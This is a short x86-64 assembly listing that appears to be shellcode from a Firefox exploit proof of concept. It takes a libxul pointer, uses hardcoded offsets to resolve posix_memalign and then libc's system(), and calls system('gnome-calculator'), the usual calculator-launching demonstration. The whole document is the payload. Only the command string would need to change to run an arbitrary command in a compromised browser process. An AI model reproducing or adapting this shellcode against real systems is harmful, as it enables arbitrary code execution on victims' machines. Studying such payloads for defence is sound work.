section .text
global main
main:
	pop rbx;libxul ptr
	sub rbx, 221637047
	add rbx, 283603440; 
	mov rcx, [rbx]; rcx = _posix_memalign
	sub rcx, 554496
	add rcx, 283536; rcx = system_ptr
	jmp get_str
callback:
	pop rdi
	xor rax, rax
	call rcx ;call system
get_str:
	call callback
s: db "gnome-calculator",0
